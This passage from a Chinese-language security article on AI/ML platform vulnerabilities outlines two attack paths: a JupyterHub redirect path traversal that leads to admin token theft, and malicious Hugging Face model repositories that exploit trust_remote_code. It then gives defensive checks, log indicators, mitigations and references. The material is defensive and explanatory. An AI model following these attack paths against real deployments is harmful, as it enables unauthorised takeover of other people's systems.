**影响平台**: JupyterHub (CVE-2024-22421)

**特征**:
- 登录/重定向流程中的路径解析不一致
- 重定向目标中的特殊序列（`/../`）导致权限提升
- Token/Cookie 在认证检查前被设置

**攻击路径**:
```
构造特殊 next 参数 → 路径穿越重定向 → 获取 admin token → 完全控制
```

### 模式 5：远程代码加载机制

**影响平台**: Hugging Face (CVE-2024-24802)

**特征**:
- 框架提供信任远程代码的配置选项
- 恶意代码以模型的名义分发
- 用户在使用过程中容易忽略风险提示

**攻击路径**:
```
发布恶意模型仓库 → 诱导用户 trust_remote_code=True → 自定义 modeling 代码执行 → RCE
```

---

## 0x09 应急排查与防守建议

### 紧急排查清单

```bash
# 1. 检查 Ray Dashboard 是否暴露且无认证
curl -s http://localhost:8265/api/version
curl -s http://localhost:8265/api/jobs/ | head -50

# 2. 检查 TorchServe Management API
curl -s http://localhost:8081/models
curl -s http://localhost:8081/models/<model_name>

# 3. 检查 JupyterHub 版本
jupyterhub --version
# 检查 Jupyter Server 版本
pip show jupyter-server | grep Version

# 4. 检查 MLflow 版本
mlflow --version
# 检查 MLflow 是否开启认证
curl -s http://localhost:5000/api/2.0/mlflow/experiments/search

# 5. 检查 TensorFlow 版本
python3 -c "import tensorflow; print(tensorflow.__version__)"

# 6. 检查 Transformers 版本
pip show transformers | grep Version

# 7. 检查是否使用了不安全的 pickle 模型文件
find /opt/mlflow /home -name "*.bin" -o -name "model.pkl" 2>/dev/null

# 8. 检查暴露在公网的服务端口
ss -tlnp | grep -E '(8265|8081|5000|8888|8000)'

# 9. 检查 Kubeflow Katib 版本
kubectl get pods -n kubeflow -o jsonpath='{.items[*].spec.containers[*].image}'

# 10. 检查是否有可疑的 Ray Job
curl -s http://localhost:8265/api/jobs/ | python3 -m json.tool
```

### 日志关键字段表

| 平台 | 日志文件 | 关键字段 | 异常指标 |
|------|---------|---------|---------|
| Ray Dashboard | `/tmp/ray/session_latest/logs/` | `entrypoint`, `job_id` | 非常规 entrypoint 命令 |
| JupyterHub | JupyterHub 日志 | `next`, `redirect` | `next=/../` 路径穿越 |
| MLflow | MLflow 服务日志 | `artifact_location`, `run_id` | 异常 artifact URI（内网地址） |
| TorchServe | TorchServe 日志 | `model_name` | `model_name` 含 `../` |
| Hugging Face | 应用日志 | `trust_remote_code` | 从不可信来源加载远程代码 |

### 紧急缓解措施

| 优先级 | 措施 | 适用平台 |
|-------|------|---------|
| P0 | 立即启用所有管理 API 的认证 | Ray, TorchServe |
| P0 | 升级到已修复版本 | 全部 |
| P0 | 将管理端口从公网移至内网/VPN | Ray, TorchServe, JupyterHub |
| P1 | 配置网络 ACL/防火墙规则限制访问 | 全部 |
| P1 | 禁用 `trust_remote_code=True` | Hugging Face |
| P1 | 配置 MLflow 启用认证 | MLflow |
| P2 | 部署 WAF 规则拦截路径穿越 | JupyterHub, Jupyter Server |
| P2 | 限制 MLflow artifact URI 为本地路径 | MLflow |

### 长期安全加固建议

**1. 模型格式迁移**

将所有模型从 Pickle 格式（`.bin`、`.pkl`）迁移到 `safetensors` 格式：

```python
# 使用 safetensors 替代 pickle
from safetensors.torch import save_file, load_file
# save_file(model.state_dict(), "model.safetensors")
# model.load_state_dict(load_file("model.safetensors"))
```

**2. 网络隔离**

- AI/ML 平台管理端口不应暴露在公网
- 使用 Kubernetes NetworkPolicy 或防火墙规则限制访问
- 通过 VPN 或零信任网络访问管理接口

**3. RBAC 权限控制**

- 为每个平台配置独立的身份认证和授权机制
- 遵循最小权限原则分配 API 访问权限
- 启用审计日志记录所有管理操作

**4. 模型扫描与验证**

- 建立模型仓库的准入审查机制
- 对上传的模型文件进行安全扫描
- 使用模型签名验证模型完整性

**5. 持续监控**

- 部署 AI/ML 平台专用的异常检测规则
- 监控模型仓库的新增和修改
- 跟踪 CISA KEV 和安全社区的最新披露

---

## 0x0A 参考资料

1. **CVE-2024-22421 JupyterHub 认证绕过**: https://github.com/evi1haxx/CVE-2024-22421
2. **CVE-2023-48022 Ray Dashboard 漏洞讨论**: https://github.com/ray-project/ray/issues/38761
3. **CVE-2024-37032 TorchServe 漏洞分析 — Wiz Research**: https://www.wiz.io/blog/pytorch-torchserve-vulnerabilities
4. **MLflow 安全公告与版本更新**: https://mlflow.org/docs/latest/security.html
5. **CISA Known Exploited Vulnerabilities Catalog**: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
6. **TensorFlow 安全公告**: https://www.tensorflow.org/tensorflow/security/advisories
7. **Hugging Face 安全文档**: https://huggingface.co/docs/hub/en/security
8. **JupyterHub 安全发布**: https://jupyterhub.readthedocs.io/en/stable/changelog.html
9. **Kubeflow 安全公告**: https://www.kubeflow.org/docs/about/security/
10. **PyTorch safetensors 安全模型格式**: https://huggingface.co/docs/safetensors
11. **Nuclei — 高速漏洞扫描器**: https://github.com/projectdiscovery/nuclei
12. **AI/ML 平台安全最佳实践 — OWASP**: https://owasp.org/www-project-machine-learning-security-top-10/